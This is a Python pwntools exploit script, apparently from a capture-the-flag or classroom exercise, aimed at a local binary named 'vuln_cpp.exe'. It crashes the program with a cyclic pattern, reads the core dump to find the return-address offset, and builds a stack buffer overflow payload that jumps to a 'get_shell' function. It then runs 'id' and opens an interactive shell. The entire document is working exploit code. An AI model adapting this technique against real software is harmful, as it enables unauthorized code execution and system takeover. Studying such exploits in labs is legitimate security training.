#! /usr/bin/env python

# https://docs.pwntools.com/en/stable/elf/corefile.html

from pwn import *

target_name = './vuln_cpp.exe'
# Set up pwntools for the correct architecture
exe = context.binary = ELF(target_name)

# print(exe.symbols)

# Generate a cyclic pattern so that we can auto-find the offset
payload = cyclic(128)

# Run the process once so that it crashes
p = process([target_name, payload])
p.wait()  # wait for close

# Get the core dump of the crashed process
core = p.corefile

# read the core dump file directly
# core = Core('coredump_file')

# Our cyclic pattern should have been used as the crashing address, make sure!
# assert p32(core.eip) in payload
crash_ip = core.eip
offset = cyclic_find(crash_ip)
# offset = cyclic_find(core.read(core.esp, 4))-4
print(f'{offset=}')
# search for get_shell function address
# in C; func_address = exe.symbols.get_shell
# in C++; parse the symbols dictionary to look for function name in key
for symbol in exe.symbols.keys():
    if symbol.find("get_shell") >= 0:
        func_address = exe.symbols[symbol]
        break

print(f'{hex(func_address)=}')

payload = flat({
    offset: func_address
}, filler='A')

print(f'{payload=}')

io = process([target_name, payload])
# receive and print the payload
print(io.recvline())
# Send the `id` command to the shell
io.sendline(b'id')
# receive and print the output of the command
print(io.recvline())
# get interactive shell
io.interactive()
